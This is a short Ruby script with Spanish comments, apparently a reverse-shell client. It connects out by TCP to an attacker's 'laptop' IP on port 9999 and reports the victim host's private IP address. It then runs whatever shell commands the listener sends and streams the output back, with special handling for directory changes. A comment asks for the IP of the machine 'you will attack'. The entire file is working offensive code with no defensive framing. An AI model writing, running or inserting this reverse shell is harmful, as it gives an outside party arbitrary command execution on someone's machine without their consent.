require 'socket'

# Cambia esto a la IP de tu laptop
laptop_ip = 'coloca la ip desde la maquina que atacaras'  
laptop_port = 9999

# Crea un socket y se conecta a la laptop
client_socket = TCPSocket.new(laptop_ip, laptop_port)

# Envía la IP de la PC al servidor
client_socket.puts(Socket.ip_address_list.detect(&:ipv4_private?).ip_address)

def ejecucion(client_socket)
  while true
    comando = client_socket.gets.chomp

    break if comando.downcase == 'exit' # Salir si el comando es 'exit'

    if comando.start_with?("cd ")
      nuevo_directorio = comando[3..-1]
      begin
        Dir.chdir(nuevo_directorio)
        puts "cambiando directorio : #{Dir.pwd}"
      rescue Errno::ENOENT
        puts "error no existe"
      end
    else
      # Ejecutar el comando y capturar la salida
      output = `#{comando}` # Esto ejecuta el comando en la terminal y captura la salida
      
      # Enviar la salida completa al servidor
      output.each_line do |line|
        client_socket.puts(line)
      end
      client_socket.puts # Enviar una línea vacía para indicar el final de la salida
    end
  end
end

# Ejecuta la función de ejecución
ejecucion(client_socket)

client_socket.close
